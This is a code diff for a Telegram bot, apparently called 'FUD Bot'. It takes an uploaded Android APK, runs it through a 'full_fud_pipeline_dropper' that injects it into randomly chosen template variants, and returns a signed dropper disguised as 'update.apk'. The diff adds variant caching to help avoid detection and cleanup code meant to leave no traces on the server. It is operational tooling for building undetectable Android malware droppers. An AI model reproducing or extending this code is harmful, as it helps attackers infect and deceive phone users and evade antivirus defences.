@@ -13,7 +13,7 @@ from telegram.ext import (
 )
 from telegram.error import Conflict
 
-from config import BOT_TOKEN, WORK_DIR, TEMPLATE_APK
+from config import BOT_TOKEN, WORK_DIR, TEMPLATE_APK, VARIANTS_DIR
 from pipeline import full_fud_pipeline_dropper, ensure_tools
 from setup import _setup_done, _setup_error
 
@@ -59,9 +59,16 @@ async def _heartbeat(status, stop_event, prefix, session_dir):
 
 
 async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    tpl = "READY" if os.path.exists(TEMPLATE_APK) else "MISSING"
+    tpl_ok = os.path.exists(TEMPLATE_APK)
+    variants = 0
+    if os.path.isdir(VARIANTS_DIR):
+        variants = len([f for f in os.listdir(VARIANTS_DIR) if f.endswith(".apk")])
+    status = "READY" if (tpl_ok or variants > 0) else "MISSING"
     await update.message.reply_text(
-        f"🤖 FUD Bot\n\nTemplate: {tpl}\n\nAPK bhejo, signed dropper milega."
+        f"🤖 FUD Bot\n\n"
+        f"Template: {status}\n"
+        f"Variants cached: {variants}\n\n"
+        f"APK bhejo, signed dropper milega."
     )
 
 
@@ -72,7 +79,11 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("Sirf .apk bhejo.")
         return
 
-    if not os.path.exists(TEMPLATE_APK):
+    # Template check — either variant cache or single template
+    has_variants = os.path.isdir(VARIANTS_DIR) and any(
+        f.endswith(".apk") for f in os.listdir(VARIANTS_DIR)
+    )
+    if not has_variants and not os.path.exists(TEMPLATE_APK):
         await msg.reply_text(
             "❌ template.apk server pe nahi mila.\n"
             "GitHub repo root me daal ke redeploy karo."
@@ -87,12 +98,14 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     status = await msg.reply_text("⚙️ Download...")
     stop_hb = asyncio.Event()
+    hb_task = None
 
     try:
         tg_file = await context.bot.get_file(doc.file_id)
         await tg_file.download_to_drive(input_path)
         size_mb = os.path.getsize(input_path) / (1024 * 1024)
 
+        # tools ensure (fast if already ready)
         await status.edit_text(f"🔧 Tools... ({size_mb:.1f} MB)")
         hb_task = asyncio.create_task(
             _heartbeat(status, stop_hb, "🔧 Tools...", session_dir)
@@ -103,15 +116,19 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await hb_task
         except Exception:
             pass
+        hb_task = None
 
+        # main pipeline
         stop_hb = asyncio.Event()
         hb_task = asyncio.create_task(
             _heartbeat(status, stop_hb, "🧬 Injecting...", session_dir)
         )
 
+        # pick template — variant or fallback
         await asyncio.to_thread(
             full_fud_pipeline_dropper,
-            TEMPLATE_APK, input_path, output_path, session_dir,
+            "",  # empty → pipeline picks random variant or fallback
+            input_path, output_path, session_dir,
         )
 
         stop_hb.set()
@@ -119,11 +136,14 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await hb_task
         except Exception:
             pass
+        hb_task = None
 
+        # upload
         await status.edit_text("📤 Uploading...")
         with open(output_path, "rb") as f:
             await msg.reply_document(document=f, filename="update.apk")
         await status.edit_text("✅ Ready!")
+
     except Exception as e:
         tb = traceback.format_exc()
         print(tb, flush=True)
@@ -134,9 +154,26 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await msg.reply_text(f"❌ {str(e)[:400]}")
             except Exception:
                 pass
+
     finally:
         stop_hb.set()
+        if hb_task is not None:
+            try:
+                await hb_task
+            except Exception:
+                pass
+        # Full cleanup — server pe kuch na bache
         shutil.rmtree(session_dir, ignore_errors=True)
+        try:
+            if os.path.exists(input_path):
+                os.remove(input_path)
+        except Exception:
+            pass
+        try:
+            if os.path.exists(output_path):
+                os.remove(output_path)
+        except Exception:
+            pass
 
 
 async def run_bot():
@@ -147,9 +184,9 @@ async def run_bot():
         print(f"[!] setup error: {_setup_error['exc']}", flush=True)
 
     if os.path.exists(TEMPLATE_APK):
-        print(f"[✓] template found: {os.path.getsize(TEMPLATE_APK)} bytes", flush=True)
+        print(f"[✓] template: {os.path.getsize(TEMPLATE_APK)} bytes", flush=True)
     else:
-        print(f"[!] template missing: {TEMPLATE_APK}", flush=True)
+        print(f"[!] template.apk missing", flush=True)
 
     await asyncio.sleep(3)
 
@@ -177,7 +214,7 @@ async def run_bot():
             print("🤖 polling active.", flush=True)
             break
         except Conflict as e:
-            print(f"[!] conflict retry 10s", flush=True)
+            print(f"[!] conflict, retry 10s", flush=True)
             await asyncio.sleep(10)
         except Exception as e:
             print(f"[!] poll err: {e}, retry 5s", flush=True)
